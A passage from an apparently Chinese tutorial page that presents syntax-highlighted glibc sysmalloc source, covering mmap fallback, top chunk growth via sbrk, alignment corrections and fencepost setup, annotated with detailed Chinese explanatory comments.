here</span><br><span class="hljs-comment">                   and in memalign(), and still be able to compute proper</span><br><span class="hljs-comment">                   address argument for later munmap in free() and realloc().</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-comment">// 如果 MALLOC_ALIGNMENT 不等于 2 * SIZE_SZ，则分配的内存</span><br>                <span class="hljs-comment">// 可能是不对齐的，按照 MALLOC_ALIGNMENT 具体的值进行对齐</span><br>                <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ) &#123;<br>                    <span class="hljs-comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span><br><span class="hljs-comment">                       MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span><br><span class="hljs-comment">                       aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span><br>                    <span class="hljs-comment">// 检测是否对齐</span><br>                    assert(((INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    front_misalign = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span><br>                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;<br>                <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                    correction = MALLOC_ALIGNMENT - front_misalign;<br>                    p = (mchunkptr) (mm + correction);<br>                    set_prev_size (p, correction);<br>                    set_head (p, (size - correction) | IS_MMAPPED);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = (mchunkptr) mm;<br>                    set_prev_size (p, <span class="hljs-number">0</span>);<br>                    set_head (p, size | IS_MMAPPED);<br>                &#125;<br><br>                <span class="hljs-comment">/* update statistics */</span><br>                <span class="hljs-comment">// 更新相关统计值，首先将当前进程 mmap 分配内存块的计数加一，如果使用</span><br>                <span class="hljs-comment">// mmap() 分配的内存块数量大于设置的最大值，将最大值设置为最新值，这个</span><br>                <span class="hljs-comment">// 判断不会成功，因为使用mmap分配内存的条件中包括了mp_.n_mmaps &lt; mp_.n_mmaps_max，</span><br>                <span class="hljs-comment">// 所以++mp_.n_mmaps &gt; mp_.max_n_mmaps 不会成立。然后更新 mmap 分配的内存</span><br>                <span class="hljs-comment">// 总量，如果该值大于设置的最大值，将当前值赋值给 mp_.max_mmapped_mem</span><br>                <span class="hljs-type">int</span> new = atomic_exchange_and_add(&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>                <span class="hljs-type">atomic_max</span>(&amp;mp_.max_n_mmaps, new);<br><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;<br>                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;<br>                <span class="hljs-type">atomic_max</span>(&amp;mp_.max_mmapped_mem, sum);<br><br>                check_chunk (av, p);<br>                <span class="hljs-comment">// 将分配的 chunk 的指针返回，用户存放数据时就是从该指针指向的内存开始存放</span><br>                <span class="hljs-keyword">return</span> chunk2mem (p);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* There are no usable arenas and mmap also failed.  */</span><br>    <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Record incoming configuration of top */</span><br>    <span class="hljs-comment">// 保存当前 top chunk 的指针，大小和结束地址到临时变量中</span><br>    old_top = av-&gt;top;<br>    old_size = chunksize (old_top);<br>    old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<br><br>    brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If not the first time through, we require old_size to be</span><br><span class="hljs-comment">       at least MINSIZE and to have prev_inuse set.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// 检查 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，</span><br>    <span class="hljs-comment">// 可能 old_size 为 0，如果 top chunk 已经初始化，则 top chunk 的大小必须</span><br>    <span class="hljs-comment">// 大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，fencepost 需要 MINSIZE</span><br>    <span class="hljs-comment">// 大小的内存。Top chunk 必须标识前一个 chunk 处于 inuse 状态，这是规定，并且</span><br>    <span class="hljs-comment">// top chunk 的结束地址必定是页对齐的。另外 top chunk 的除去 fencepost 的大小</span><br>    <span class="hljs-comment">// 必定小于所需 chunk 的大小，不然在_int_malloc()函数中就应该使用 top chunk 获得所需的 chunk</span><br>    assert((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>    prev_inuse (old_top) &amp;&amp;<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br><br>    <span class="hljs-comment">/* Precondition: not enough current space to satisfy nb request */</span><br>    assert((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br><br>    <span class="hljs-comment">// 如果当前分配区为非主分配区</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena) &#123;<br>        heap_info *old_heap, *heap;<br>        <span class="hljs-type">size_t</span> old_heap_size;<br><br>        <span class="hljs-comment">/* First try to extend the current heap. */</span><br>        old_heap = heap_for_ptr (old_top);<br>        old_heap_size = old_heap-&gt;size;<br>        <span class="hljs-comment">// 根据 top chunk 的指针获得当前 sub_heap 的 heap_info 实例，</span><br>        <span class="hljs-comment">// 如果 top chunk 的剩余有效空间不足以分配出所需的 chunk（前</span><br>        <span class="hljs-comment">// 面已经断言，这个肯定成立），尝试增长 sub_heap 的可读可写区</span><br>        <span class="hljs-comment">// 域大小，如果成功，修改过内存分配的统计信息，并更新新的 top chunk 的 size</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE +nb - old_size) &gt; <span class="hljs-number">0</span><br>                                              &amp;&amp; grow_heap(old_heap, MINSIZE +nb - old_size) == <span class="hljs-number">0</span>)<br>        &#123;<br>            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;<br>            set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)<br>                               | PREV_INUSE);<br>        &#125;<br>        <span class="hljs-comment">// 调用 new_heap()函数创建一个新的 sub_heap，由于这个 sub_heap 中至少</span><br>        <span class="hljs-comment">// 需要容下大小为 nb 的 chunk，大小为 MINSIZE 的 fencepost 和大小为 sizeof(*heap)</span><br>        <span class="hljs-comment">// 的 heap_info 实例，所以传入 new_heap()函数的分配大小为 nb + (MINSIZE + sizeof(*heap))</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap(nb + (MINSIZE +<span class="hljs-keyword">sizeof</span>(*heap)), mp_.top_pad)))<br>        &#123;<br>            <span class="hljs-comment">/* Use a newly allocated heap.  */</span><br>            <span class="hljs-comment">// 使新创建的 sub_heap 保存当前的分配区指针，将该 sub_heap 加入当前分配区的</span><br>            <span class="hljs-comment">// sub_heap 链表中，更新当前分配区内存分配统计，将新创建的 sub_heap 仅有的一</span><br>            <span class="hljs-comment">// 个空闲chunk 作为当前分配区的 top chunk，并设置 top chunk 的状态</span><br>            heap-&gt;ar_ptr = av;<br>            heap-&gt;prev = old_heap;<br>            av-&gt;system_mem += heap-&gt;size;<br>            <span class="hljs-comment">/* Set up the new top.  */</span><br>            top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span>(*heap));<br>            set_head (top(av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span>(*heap)) | PREV_INUSE);<br><br>            <span class="hljs-comment">/* Setup fencepost and free the old top chunk with a multiple of</span><br><span class="hljs-comment">               MALLOC_ALIGNMENT in size. */</span><br>            <span class="hljs-comment">/* The fencepost takes at least MINSIZE bytes, because it might</span><br><span class="hljs-comment">               become the top chunk again later.  Note that a footer is set</span><br><span class="hljs-comment">               up, too, although the chunk is marked in use. */</span><br>            old_size = (old_size - MINSIZE) &amp;~MALLOC_ALIGN_MASK;<br>            set_head (chunk_at_offset(old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | PREV_INUSE);<br>            <span class="hljs-comment">// 设置原 top chunk 的 fencepost，fencepost 需要 MINSIZE 大小的内存空间，将该 old_size</span><br>            <span class="hljs-comment">// 减去 MINSIZE 得到原 top chunk 的有效内存空间，首先设置 fencepost 的第二个 chunk 的 size</span><br>            <span class="hljs-comment">// 为 0，并标识前一个 chunk 处于 inuse 状态。接着判断原 top chunk 的有效内存空间上是否大</span><br>            <span class="hljs-comment">// 于等于 MINSIZE，如果是，表示原 top chunk 可以分配出大于等于 MINSIZE 大小的 chunk，于</span><br>            <span class="hljs-comment">// 是将原 top chunk 切分成空闲 chunk 和 fencepost 两部分，先设置 fencepost 的第一个 chunk</span><br>            <span class="hljs-comment">// 的大小为 2*SIZE_SZ，并标识前一个 chunk 处于 inuse 状态，fencepost 的第一个 chunk 还需</span><br>            <span class="hljs-comment">// 要设置 foot，表示该 chunk 处于空闲状态，而 fencepost 的第二个 chunk 却标识第一个 chunk</span><br>            <span class="hljs-comment">// 处于 inuse 状态，因为不能有两个空闲 chunk 相邻，才会出现这么奇怪的 fencepost。另外其</span><br>            <span class="hljs-comment">// 实 top chunk 切分出来的 chunk 也是处于空闲状态，但 fencepost 的第一个 chunk 却标识前一</span><br>            <span class="hljs-comment">// 个 chunk 为 inuse 状态，然后强制将该处于 inuse 状态的 chunk 调用_int_free()函数释放掉</span><br>            <span class="hljs-comment">// 这样做完全是要遵循不能有两个空闲 chunk 相邻的约定</span><br>            <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>            &#123;<br>                set_head (chunk_at_offset(old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                set_foot (chunk_at_offset(old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br>                set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br>                _int_free(av, old_top, <span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-comment">// 如果原 top chunk 中有效空间不足 MINSIZE，则将整个原 top chunk 作为 fencepost，</span><br>            <span class="hljs-comment">// 并设置 fencepost 的第一个 chunk 的相关状态</span><br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 如果增长 sub_heap 的可读可写区域大小和创建新 sub_heap 都失败了，</span><br>        <span class="hljs-comment">// 尝试使用 mmap() 函数直接从系统分配所需 chunk</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)<br>            <span class="hljs-comment">/* We can at least try to use to mmap memory.  */</span><br>            <span class="hljs-keyword">goto</span> try_mmap;<br>    &#125; <span class="hljs-keyword">else</span>     <span class="hljs-comment">/* av == main_arena */</span><br>    <span class="hljs-comment">// 如果当前分配区为主分配区</span><br><br>    &#123; <span class="hljs-comment">/* Request enough space for nb + pad + overhead */</span><br>        size = nb + mp_.top_pad + MINSIZE;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If contiguous, we can subtract out existing space that we hope to</span><br><span class="hljs-comment">           combine with new space. We add it back later only if</span><br><span class="hljs-comment">           we don&#x27;t actually get contiguous space.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 一般情况下，主分配区使用 sbrk()从 heap 中分配内存，sbrk()返回连续的虚拟内存，</span><br>        <span class="hljs-comment">// 这里调整需要分配的 size，减掉 top chunk 中已有空闲内存大小</span><br>        <span class="hljs-keyword">if</span> (contiguous (av))<br>            size -= old_size;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Round to a multiple of page size.</span><br><span class="hljs-comment">           If MORECORE is not contiguous, this ensures that we only call it</span><br><span class="hljs-comment">           with whole-page arguments.  And if MORECORE is contiguous and</span><br><span class="hljs-comment">           this is not first time through, this preserves page-alignment of</span><br><span class="hljs-comment">           previous calls. Otherwise, we correct to page-align below.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">//  将 size 按照页对齐，sbrk()必须以页为单位分配连续虚拟内存</span><br>        size = ALIGN_UP(size, pagesize);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Don&#x27;t try to call MORECORE if argument is so big as to appear</span><br><span class="hljs-comment">           negative. Note that since mmap takes size_t arg, it may succeed</span><br><span class="hljs-comment">           below even if we cannot call MORECORE.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 使用 sbrk()从 heap 中分配 size 大小的虚拟内存块</span><br>        <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>            brk = (<span class="hljs-type">char</span> *) (MORECORE(size));<br>            LIBC_PROBE(memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);<br>        &#125;<br>        <span class="hljs-comment">// 如果 sbrk()分配成功，并且 morecore 的 hook 函数存在，调用 morecore 的 hook 函数</span><br>        <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>            <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>            <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span>) = atomic_forced_read(__after_morecore_hook);<br>            <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                (*hook)();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               If have mmap, try using it as a backup when MORECORE fails or</span><br><span class="hljs-comment">               cannot be used. This is worth doing on systems that have &quot;holes&quot; in</span><br><span class="hljs-comment">               address space, so sbrk cannot extend to give contiguous space, but</span><br><span class="hljs-comment">               space is available elsewhere.  Note that we ignore mmap max count</span><br><span class="hljs-comment">               and threshold limits, since the space will not be used as a</span><br><span class="hljs-comment">               segregated mmap region.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">// 如果 sbrk()返回失败，或是 sbrk()不可用，使用 mmap()代替，重新计算所需分配的内存</span><br>            <span class="hljs-comment">// 大小并按页对齐，如果重新计算的 size 小于 1M，将 size 设为 1M，也就是说使用 mmap()</span><br>            <span class="hljs-comment">// 作为 morecore 函数分配的最小内存块大小为 1M</span><br>            <span class="hljs-comment">/* Cannot merge with old top, so add its size back in */</span><br>            <span class="hljs-keyword">if</span> (contiguous (av))<br>                size = ALIGN_UP(size + old_size, pagesize);<br><br>            <span class="hljs-comment">/* If we are relying on mmap as backup, then use larger units */</span><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))<br>                size = MMAP_AS_MORECORE_SIZE;<br><br>            <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>            <span class="hljs-comment">// 如果所需分配的内存大小合法，使用 mmap()函数分配内存。如果分配成功，更新 brk</span><br>            <span class="hljs-comment">// 和 snd_brk，并将当前分配区属性设置为可分配不连续虚拟内存块</span><br>              <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>                  <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>                  <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED) &#123;<br>                      <span class="hljs-comment">/* We do not need, and cannot use, another sbrk call to find end */</span><br>                    brk = mbrk;<br>                    snd_brk = brk + size;<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       Record that we no longer have a contiguous sbrk region.</span><br><span class="hljs-comment">                       After the first time mmap is used as backup, we do not</span><br><span class="hljs-comment">                       ever rely on contiguous space since this could incorrectly</span><br><span class="hljs-comment">                       bridge regions.</span><br><span class="hljs-comment">                     */</span><br>                    set_noncontiguous (av);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//如果brk合法，即sbrk()或mmap()分配成功，如果sbrk_base还没有初始化，</span><br>        <span class="hljs-comment">//更新 sbrk_base 和当前分配区的内存分配总量</span><br>        <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>            <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)<br>                mp_.sbrk_base = brk;<br>            av-&gt;system_mem += size;<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               If MORECORE extends previous space, we can likewise extend top size.</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-comment">// 如果 sbrk()分配成功，更新 top chunk 的大小，并设定 top chunk 的前一个 chunk 处于 inuse</span><br>            <span class="hljs-comment">// 状态。如果当前分配区可分配连续虚拟内存，原 top chunk 的大小大于 0，但新的 brk 值小</span><br>            <span class="hljs-comment">// 于原 top chunk 的结束地址，则出错了</span><br>            <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                set_head (old_top, (size + old_size) | PREV_INUSE);<br><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)<br>                <span class="hljs-comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span><br>                malloc_printerr(<span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>);<br><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                   Otherwise, make adjustments:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * If the first time through or noncontiguous, we need to call sbrk</span><br><span class="hljs-comment">                    just to find out where the end of memory lies.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * We need to ensure that all returned chunks from malloc will meet</span><br><span class="hljs-comment">                    MALLOC_ALIGNMENT</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * If there was an intervening foreign sbrk, we need to adjust sbrk</span><br><span class="hljs-comment">                    request size to account for fact that we will not be able to</span><br><span class="hljs-comment">                    combine new space with existing space in old_top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                 * Almost all systems internally allocate whole pages at a time, in</span><br><span class="hljs-comment">                    which case we might as well use the whole last page of request.</span><br><span class="hljs-comment">                    So we allocate enough more memory to hit a page boundary now,</span><br><span class="hljs-comment">                    which in turn causes future contiguous calls to page-align.</span><br><span class="hljs-comment">                 */</span><br>            <span class="hljs-comment">// 执行到这个分支，意味着 sbrk()返回的 brk 值大于原 top chunk 的结束地址，</span><br>            <span class="hljs-comment">// 那么新的地址与原 top chunk 的地址不连续，可能是由于外部其它地方调用 sbrk()函数，</span><br>            <span class="hljs-comment">// 这里需要处理地址的重新对齐问题</span><br>            <span class="hljs-keyword">else</span> &#123;<br><br>                front_misalign = <span class="hljs-number">0</span>;<br>                end_misalign = <span class="hljs-number">0</span>;<br>                correction = <span class="hljs-number">0</span>;<br>                aligned_brk = brk;<br><br>                <span class="hljs-comment">/* handle contiguous cases */</span><br>                <span class="hljs-keyword">if</span> (contiguous (av)) &#123;<br>                    <span class="hljs-comment">/* Count foreign sbrk as system_mem.  */</span><br>                    <span class="hljs-comment">// 如果本分配区可分配连续虚拟内存，并且有外部调用了 sbrk()函数，</span><br>                    <span class="hljs-comment">// 将外部调用 sbrk()分配的内存计入当前分配区所分配内存统计中</span><br>                    <span class="hljs-keyword">if</span> (old_size)<br>                        av-&gt;system_mem += brk - old_end;<br><br>                    <span class="hljs-comment">/* Guarantee alignment of first new chunk made from this space */</span><br>                    <span class="hljs-comment">//  计算当前的 brk 要矫正的字节数据，保证 brk 地址按 MALLOC_ALIGNMENT 对齐</span><br>                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                    <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                           Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                           We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                           They will never be accessed anyway because</span><br><span class="hljs-comment">                           prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                           is always true after initialization.</span><br><span class="hljs-comment">                         */</span><br><br>                        correction = MALLOC_ALIGNMENT - front_misalign;<br>                        aligned_brk += correction;<br>                    &#125;<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       If this isn&#x27;t adjacent to existing space, then we will not</span><br><span class="hljs-comment">                       be able to merge with old_top space, so must add to 2nd request.</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">// 由于原 top chunk 的地址与当前 brk 不相邻，也就不能再使用原 top chunk 的内存了，需</span><br>                    <span class="hljs-comment">// 要重新为所需 chunk 分配足够的内存，将原 top chunk 的大小加到矫正值中，从当前 brk 中</span><br>                    <span class="hljs-comment">// 分配所需 chunk，计算出未对齐的 chunk 结束地址 end_misalign，然后将 end_misalign 按照</span><br>                    <span class="hljs-comment">// 页对齐计算出需要矫正的字节数加到矫正值上。然后再调用 sbrk()分配矫正值大小的内存，</span><br>                    <span class="hljs-comment">// 如果 sbrk()分配成功，则当前的 top chunk 中可以分配出所需的连续内存的 chunk</span><br>                    correction += old_size;<br><br>                    <span class="hljs-comment">/* Extend the end address to hit a page boundary */</span><br>                    end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);<br>                    correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;<br><br>                    assert(correction &gt;= <span class="hljs-number">0</span>);<br>                    snd_brk = (<span class="hljs-type">char</span> *) (MORECORE(correction));<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       If can&#x27;t allocate correction, try to at least find out current</span><br><span class="hljs-comment">                       brk.  It might be enough to proceed without failing.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                       Note that if second sbrk did NOT fail, we assume that space</span><br><span class="hljs-comment">                       is contiguous with first sbrk. This is a safe assumption unless</span><br><span class="hljs-comment">                       program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span><br><span class="hljs-comment">                       occurred between our first and second calls.</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">// 如果 sbrk()执行失败，更新当前 brk 的结束地址</span><br>                    <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                        correction = <span class="hljs-number">0</span>;<br>                        snd_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br>                    &#125;<br>                    <span class="hljs-comment">// 如果 sbrk()执行成功，并且有 morecore hook 函数存在，执行该 hook 函数</span><br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>                        <span class="hljs-type">void</span> (*hook)(<span class="hljs-type">void</span>) = atomic_forced_read(__after_morecore_hook);<br>                        <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                            (*hook)();<br>                    &#125;<br>                &#125;<br><br>                    <span class="hljs-comment">/* handle non-contiguous cases */</span><br>                <span class="hljs-comment">// 执行到这里，意味着 brk 是用 mmap()分配的</span><br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                        <span class="hljs-comment">/* MORECORE/mmap must correctly align */</span><br>                        assert(((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-comment">// 对齐操作</span><br>                    <span class="hljs-keyword">else</span> &#123;<br>                        front_misalign = (INTERNAL_SIZE_T)chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                        <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-comment">/*</span><br><span class="hljs-comment">                               Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                               We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                               They will never be accessed anyway because</span><br><span class="hljs-comment">                               prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                               is always true after initialization.</span><br><span class="hljs-comment">                             */</span><br><br>                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-comment">/* Find out current end of memory */</span><br>                    <span class="hljs-comment">// 如果 brk 的结束地址非法，使用 morecore 获得当前 brk 的结束地址</span><br>                    <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                        snd_brk = (<span class="hljs-type">char</span> *) (MORECORE(<span class="hljs-number">0</span>));<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">/* Adjust top based on results of second sbrk */</span><br>                <span class="hljs-comment">// 如果 brk 的结束地址合法，设置当前分配区的 top chunk 为 brk，</span><br>                <span class="hljs-comment">// 设置 top chunk 的大小，并更新分配区的总分配内存量</span><br>                <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE)) &#123;<br>                    av-&gt;top = (mchunkptr) aligned_brk;<br>                    set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<br>                    av-&gt;system_mem += correction;<br><br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                       If not the first time through, we either have a</span><br><span class="hljs-comment">                       gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="hljs-comment">                       double fencepost at old_top to prevent consolidation with space</span><br><span class="hljs-comment">                       we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="hljs-comment">                       marked as inuse and are in any case too small to use.  We need</span><br><span class="hljs-comment">                       two to make sizes and alignments work out.</span><br><span class="hljs-comment">                     */</span><br>                    <span class="hljs-comment">// 设置原 top chunk 的 fencepost，fencepost 需要 MINSIZE 大小的内存空间，将该 old_size</span><br>                    <span class="hljs-comment">// 减去 MINSIZE 得到原 top chunk 的有效内存空间，我们可以确信原 top chunk 的有效内存空间</span><br>                    <span class="hljs-comment">// 一定大于 MINSIZE，将原 top chunk 切分成空闲 chunk 和 fencepost 两部分，首先设置切分出</span><br>                    <span class="hljs-comment">// 来的 chunk 的大小为 old_size，并标识前一个 chunk 处于 inuse 状态，原 top chunk 切分出来</span><br>                    <span class="hljs-comment">// 的chunk本应处于空闲状态，但fencepost的第一个chunk却标识前一个chunk为inuse状态，</span><br>                    <span class="hljs-comment">// 然后强制将该处于 inuse 状态的 chunk 调用_int_free()函数释放掉。然后设置 fencepost 的第</span><br>                    <span class="hljs-comment">// 一个 chunk 的大小为 2*SIZE_SZ，并标识前一个 chunk 处于 inuse 状态，然后设置 fencepost</span><br>                    <span class="hljs-comment">// 的第二个 chunk 的 size 为 2*SIZE_SZ，并标识前一个 chunk 处于 inuse 状态。这里的主分配区</span><br>                    <span class="hljs-comment">// 的 fencepost 与非主分配区的 fencepost 不同，主分配区 fencepost 的第二个 chunk 的大小设</span><br>                    <span class="hljs-comment">// 置为 2*SIZE_SZ，而非主分配区的 fencepost 的第二个 chunk 的大小设置为 0</span><br>                    <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                           Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                           multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                           enough space in old_top to do this.</span><br><span class="hljs-comment">                         */</span><br>                        old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                        set_head (old_top, old_size | PREV_INUSE);<br><br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                           Note that the following assignments completely overwrite</span><br><span class="hljs-comment">                           old_top when old_size was previously MINSIZE.  This is</span><br><span class="hljs-comment">                           intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="hljs-comment">                           lost.</span><br><span class="hljs-comment">                         */</span><br>                        set_head (chunk_at_offset(old_top, old_size),<br>                                  (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                        set_head (chunk_at_offset(old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>                                  (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br><br>                        <span class="hljs-comment">/* If possible, release the rest. */</span><br>                        <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                        &#123;<br>                            _int_free(av, old_top, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        